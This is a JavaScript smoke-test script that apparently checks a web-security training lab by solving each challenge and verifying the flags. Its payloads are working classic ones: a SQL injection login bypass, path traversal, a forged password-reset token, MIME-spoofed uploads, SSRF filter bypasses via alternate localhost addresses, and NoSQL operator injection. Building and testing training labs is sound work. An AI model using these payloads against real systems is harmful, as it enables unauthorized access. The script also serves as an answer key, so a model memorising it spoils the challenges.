// Solves every challenge against a running server and checks the flag matches the portal's derivation.
// Usage: LAB_SECRET=... FLAG_SECRET=... [BASE=http://127.0.0.1:3000] [LAB_HOST=lab.localhost:3000] node scripts/labs-smoke.mjs
import assert from "node:assert/strict";
import { createHmac } from "node:crypto";
import http from "node:http";

const { LAB_SECRET, FLAG_SECRET } = process.env;
const BASE = new URL(process.env.BASE ?? "http://127.0.0.1:3000");
const LAB_HOST = process.env.LAB_HOST ?? "lab.localhost:3000";
if (!LAB_SECRET || !FLAG_SECRET) throw new Error("Set LAB_SECRET and FLAG_SECRET to the server's values");

const flagFor = (user, challenge) =>
  `WH{${challenge}_${createHmac("sha256", FLAG_SECRET).update(`${challenge}:${user}`).digest("hex").slice(0, 32)}}`;

function token(purpose, payload, ttl = 120) {
  const body = Buffer.from(JSON.stringify({ ...payload, p: purpose, exp: Math.floor(Date.now() / 1000) + ttl })).toString("base64url");
  return `${body}.${createHmac("sha256", LAB_SECRET).update(body).digest("base64url")}`;
}

/** Minimal client: raw http so the Host header can point at the lab host. Keeps a cookie jar. */
function client() {
  const jar = new Map();
  const request = async (method, path, { body, type, host = LAB_HOST } = {}) => {
    const headers = { Host: host };
    if (jar.size) headers.Cookie = [...jar].map(([k, v]) => `${k}=${v}`).join("; ");
    if (body !== undefined) {
      headers["Content-Type"] = type;
      headers["Content-Length"] = Buffer.byteLength(body);
    }
    const res = await new Promise((resolve, reject) => {
      const req = http.request({ hostname: BASE.hostname, port: BASE.port, method, path, headers }, resolve);
      req.on("error", reject);
      if (body !== undefined) req.write(body);
      req.end();
    });
    let text = "";
    for await (const chunk of res) text += chunk;
    for (const cookie of res.headers["set-cookie"] ?? []) {
      const [pair, ...attrs] = cookie.split(";");
      const [name, value] = pair.split("=");
      if (attrs.some((a) => a.trim().toLowerCase() === "max-age=0")) jar.delete(name.trim());
      else jar.set(name.trim(), value);
    }
    return { status: res.statusCode, location: res.headers.location, text };
  };
  request.jar = jar;
  return request;
}

const form = (data) => [new URLSearchParams(data).toString(), "application/x-www-form-urlencoded"];

async function player(user, challenge) {
  const request = client();
  const launch = await request("GET", `/launch?t=${encodeURIComponent(token("launch", { u: user, c: challenge }))}`);
  assert.equal(launch.status, 303, "launch redirects");
  return request;
}

const results = [];
async function check(name, fn) {
  try {
    await fn();
    results.push(["ok", name]);
  } catch (error) {
    results.push(["FAIL", name, error.message]);
  }
}

const flagIn = (text) => text.match(/WH\{[a-z0-9-]+_[0-9a-f]{32}\}/)?.[0];

await check("host isolation", async () => {
  const r = client();
  assert.equal((await r("GET", "/lab/launch", { host: BASE.host })).status, 404, "portal hides /lab");
  assert.equal((await r("GET", "/api/auth/get-session")).status, 404, "lab hides portal api");
  assert.equal((await r("GET", "/c/sqli-login")).status, 401, "lab requires player cookie");
});

await check("sqli-login", async () => {
  const r = await player("alice", "sqli-login");
  let res = await r("POST", "/c/sqli-login/login", { body: form({ username: "admin", password: "x" })[0], type: form({})[1] });
  assert.match(res.text, /올바르지 않습니다/);
  res = await r("POST", "/c/sqli-login/login", { body: form({ username: "admin' --", password: "x" })[0], type: form({})[1] });
  assert.equal(res.location, "/c/sqli-login/admin");
  assert.equal(flagIn((await r("GET", "/c/sqli-login/admin")).text), flagFor("alice", "sqli-login"));
});

await check("path-traversal", async () => {
  const r = await player("alice", "path-traversal");
  assert.equal(flagIn((await r("GET", "/c/path-traversal/view?name=welcome.txt")).text), undefined);
  const res = await r("GET", "/c/path-traversal/view?name=../private/note.txt");
  assert.equal(flagIn(res.text), flagFor("alice", "path-traversal"));
});

await check("auth-recovery", async () => {
  const r = await player("alice", "auth-recovery");
  const mail = await r("POST", "/c/auth-recovery/forgot", { body: form({ username: "student" })[0], type: form({})[1] });
  const studentToken = decodeURIComponent(mail.text.match(/token=([^"&<\s]+)/)[1]);
  const [id, date] = Buffer.from(studentToken, "base64").toString().split(":");
  assert.equal(id, "1002");
  const forged = Buffer.from(`1001:${date}`).toString("base64");
  assert.equal((await r("GET", "/c/auth-recovery/reset?user=admin&token=bad")).status, 400);
  const reset = await r("POST", "/c/auth-recovery/reset", { body: form({ user: "admin", token: forged, password: "x" })[0], type: form({})[1] });
  assert.equal(reset.status, 303);
  assert.equal(flagIn((await r("GET", "/c/auth-recovery/me")).text), flagFor("alice", "auth-recovery"));
});

await check("upload-filter", async () => {
  const r = await player("alice", "upload-filter");
  const multipart = (name, type, content) => {
    const b = "----wh" + Date.now();
    return [`--${b}\r\nContent-Disposition: form-data; name="file"; filename="${name}"\r\nContent-Type: ${type}\r\n\r\n${content}\r\n--${b}--\r\n`, `multipart/form-data; boundary=${b}`];
  };
  let [body, type] = multipart("x.html", "text/html", "<html><body>hi</body></html>");
  assert.equal((await r("POST", "/c/upload-filter/upload", { body, type })).status, 415, "honest MIME rejected");
  [body, type] = multipart("cat.png", "image/png", "\x89PNG fake");
  assert.equal(flagIn((await r("POST", "/c/upload-filter/upload", { body, type })).text), undefined, "real image gives no flag");
  [body, type] = multipart("x.html", "image/png", "<html><body>hi</body></html>");
  assert.equal(flagIn((await r("POST", "/c/upload-filter/upload", { body, type })).text), flagFor("alice", "upload-filter"));
});

await check("ssrf-oracle", async () => {
  const r = await player("alice", "ssrf-oracle");
  assert.equal((await r("GET", "/c/ssrf-oracle/internal-note")).status, 403);
  const gaze = (url) => r("POST", "/c/ssrf-oracle/gaze", { body: form({ url })[0], type: form({})[1] });
  assert.equal((await gaze("http://127.0.0.1:8080/internal-note")).status, 403, "blacklist");
  assert.match((await gaze("http://127.1/internal-note")).text, /ECONNREFUSED/, "wrong port");
  assert.equal(flagIn((await gaze("http://example.com/")).text), undefined);
  for (const url of ["http://127.1:8080/internal-note", "http://[::1]:8080/internal-note", "http://0.0.0.0:8080/internal-note", "http://2130706433:8080/internal-note"]) {
    assert.equal(flagIn((await gaze(url)).text), flagFor("alice", "ssrf-oracle"), url);
  }
});

await check("nosql-login", async () => {
  const r = await player("alice", "nosql-login");
  const login = (data) => r("POST", "/c/nosql-login/api/login", { body: JSON.stringify(data), type: "application/json" });
  assert.equal((await login({ username: "admin", password: "x" })).status, 401);
  assert.equal(flagIn((await login({ username: "student", password: "student" })).text), undefined);
  assert.equal((await login({ username: "admin", password: { $where: "1" } })).status, 500, "unsupported operator");
  assert.equal(flagIn((await login({ username: "admin", password: { $ne: "" } })).text), flagFor("alice", "nosql-login"));
});

await check("session cookies are bound to the player", async () => {
  const alice = await player("alice", "sqli-login");
  await alice("POST", "/c/sqli-login/login", { body: form({ username: "admin' --", password: "x" })[0], type: form({})[1] });
  assert.ok(flagIn((await alice("GET", "/c/sqli-login/admin")).text));
  // Bob replays Alice's in-challenge session cookie alongside his own player cookie.
  const bob = await player("bob", "sqli-login");
  bob.jar.set("wh_s_sqli_login", alice.jar.get("wh_s_sqli_login"));
  assert.equal((await bob("GET", "/c/sqli-login/admin")).status, 403);
});

for (const [status, name, detail] of results) console.log(`${status.padEnd(4)} ${name}${detail ? ` — ${detail}` : ""}`);
process.exit(results.some(([s]) => s === "FAIL") ? 1 : 0);
